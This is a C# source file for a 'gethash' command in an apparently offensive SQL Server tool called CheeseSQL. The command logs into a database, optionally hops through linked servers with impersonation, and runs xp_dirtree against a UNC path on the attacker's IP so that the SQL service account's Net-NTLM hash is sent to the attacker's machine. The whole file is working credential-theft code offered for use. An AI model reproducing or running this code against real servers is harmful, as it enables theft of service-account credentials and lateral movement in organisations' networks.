using CheeseSQL.Helpers;
using System;
using System.Collections.Generic;
using System.Data.SqlClient;


namespace CheeseSQL.Commands
{
    public class gethash : ICommand
    {
        public static string CommandName => "gethash";
        public string Description()
        {
            return $"[*] {CommandName}\r\n" +
                   $"  Description: Retrieve Net-NTLM Hash for Service Account from a directly accessible DB or Linked SQL Server";
        }

        public string Usage()
        {
            return $"{Description()}\r\n  " +
                $"Usage: {System.Reflection.Assembly.GetExecutingAssembly().GetName().Name} {CommandName} /db:DATABASE /server:SERVER /ip:ATTACKERIP /target:SERVER [/sqlauth /user:SQLUSER /password:SQLPASSWORD]";
        }

        public void Execute(Dictionary<string, string> arguments)
        {
            string connectInfo = "";
            string database = "";
            string connectserver = "";
            string ip = "";
            string target = "";
            string intermediate = "";
            
            string impersonate = "";
            string impersonate_intermediate = "";
            string impersonate_linked = "";


            bool sqlauth = arguments.ContainsKey("/sqlauth");

            arguments.TryGetValue("/impersonate", out impersonate);
            arguments.TryGetValue("/intermediate", out intermediate);
            arguments.TryGetValue("/target", out target);
            arguments.TryGetValue("/impersonate-intermediate", out impersonate_intermediate);
            arguments.TryGetValue("/impersonate-linked", out impersonate_linked);

            if (!arguments.TryGetValue("/db", out database))
            {
                Console.WriteLine("\r\n[X] You must supply a database!\r\n");
                return;
            }
            if (!arguments.TryGetValue("/server", out connectserver))
            {
                Console.WriteLine("\r\n[X] You must supply an authentication server!\r\n");
                return;
            }

            if (!arguments.TryGetValue("/ip", out ip))
            {
                Console.WriteLine("\r\n[X] You must supply the IP address of your attack box!\r\n");
                return;
            }

            SqlConnection connection;
            SQLExecutor.ConnectionInfo(arguments, connectserver, database, sqlauth, out connectInfo);
            if (String.IsNullOrEmpty(connectInfo))
            {
                return;
            }
            if (!SQLExecutor.Authenticate(connectInfo, out connection))
            {
                return;
            }


            string queryUNC = $"EXEC master..xp_dirtree \"\\\\{ip}\\\\test\";";
            if (!String.IsNullOrEmpty(target) && !String.IsNullOrEmpty(intermediate))
            {
                SQLExecutor.ExecuteDoubleLinkedProcedure(connection, queryUNC, target, intermediate, impersonate, impersonate_linked, impersonate_intermediate);

            }
            else if (!String.IsNullOrEmpty(target))
            {
                SQLExecutor.ExecuteLinkedProcedure(connection, queryUNC, target, impersonate, impersonate_linked);
            }
            SQLExecutor.ExecuteProcedure(connection, queryUNC);

            connection.Close();
        }
    }
}
